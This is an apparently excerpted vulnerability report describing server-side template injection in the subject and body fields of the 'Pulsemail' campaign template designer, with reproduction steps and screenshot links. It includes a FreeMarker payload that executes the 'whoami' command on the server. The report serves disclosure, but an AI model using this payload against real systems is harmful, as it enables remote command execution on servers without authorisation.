...
Server-Side Template Injection via [Email body & subject ] Parameter on [Campaign template designer] Page
...
[Pulsemail] [https://kzlabs.in/subdomains/freemarker/] [email subject & body] parameter is vulnerable to server-side template injection.
...
`https://kzlabs.in/subdomains/freemarker/`

## Steps to Reproduce

1. Navigate to the following URL, or submit the following value in the [email subject & body] field: `https://kzlabs.in/subdomains/freemarker/`
...
`#{7*7}`, `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}`
...
<img width="1434" height="1143" alt="image" src="https://github.com/user-attachments/assets/10a08ed8-ea85-4e22-a8bc-6576f8b26e41" />
...
<img width="1434" height="1143" alt="image" src="https://github.com/user-attachments/assets/1e724250-4f04-4569-9a3b-5b8bf1fc45fd" />
